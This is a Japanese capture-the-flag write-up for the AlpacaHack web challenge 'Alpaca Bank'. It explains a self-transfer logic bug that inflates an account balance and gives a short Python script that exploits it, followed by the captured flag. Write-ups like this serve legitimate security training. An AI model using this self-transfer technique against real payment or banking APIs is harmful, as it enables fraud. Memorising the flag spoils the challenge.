---
title: Alpaca Bank
category: web
genre: logic-bug
difficulty: medium
tags:
  - self-transfer
  - business-logic
  - balance-inflation
source: alpacahack:alpaca-bank
solved_at: 2026-05-29
---

# Alpaca Bank

## 問題の要点

- `/api/register` でユーザーを作り、`/api/transfer` で送金できる。
- `fromUser == toUser` のケースで残高更新が壊れ、自己送金で残高が増える。

## 解き方

同じユーザーを送金元・送金先にして、金額を増やしながら transfer を繰り返す。

```python
uid = requests.post(f"{BASE}/api/register").json()["user"]
amount = 10
while amount < 1_000_000_000_000:
    requests.post(
        f"{BASE}/api/transfer",
        json={"fromUser": uid, "toUser": uid, "amount": amount},
    )
    amount *= 2

print(requests.get(f"{BASE}/api/user/{uid}").json()["flag"])
```

## 得られた flag

```text
Alpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}
```

## 知見

- Web の資産系問題では、認証や SQLi より先に「同一ユーザー」「負数」「二重実行」「境界金額」を疑う。
- 自己送金は差し引きゼロで終わるべきだが、実装順序によっては足し込みが二重化する。

## 連携する知見

- [Web](../../../insights/web.md)
- [Web relations](../../../relations/web.md)
